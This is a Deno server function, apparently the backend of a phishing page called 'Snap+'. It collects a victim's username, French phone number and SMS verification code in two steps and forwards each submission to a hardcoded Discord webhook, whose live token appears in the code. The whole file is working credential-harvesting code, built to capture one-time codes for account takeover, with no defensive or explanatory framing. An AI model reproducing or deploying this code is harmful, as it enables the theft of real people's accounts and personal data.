import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467109225367867412/01lomqYSMEROKtSs82fkkA-9LY7ZN0QwUXZ0PIlIeCsU3cmO9oZ17QOF0_QfKyFjSeOv";

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { username, phone, code, step } = await req.json();

    let content = "";
    let color = 0xFFD700; // Gold color

    if (step === "form") {
      content = `🆕 **Nouvelle soumission Snap+**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}`;
    } else if (step === "code") {
      content = `🔐 **Code reçu**\n\n👤 **Username:** ${username}\n📱 **Téléphone:** +33${phone}\n🔑 **Code:** ${code}`;
    }

    const embed = {
      title: step === "form" ? "📱 Nouveau formulaire Snap+" : "🔐 Code de vérification",
      description: content,
      color: color,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Snap+ Verification System"
      }
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        embeds: [embed]
      }),
    });

    if (!response.ok) {
      throw new Error(`Discord webhook failed: ${response.status}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
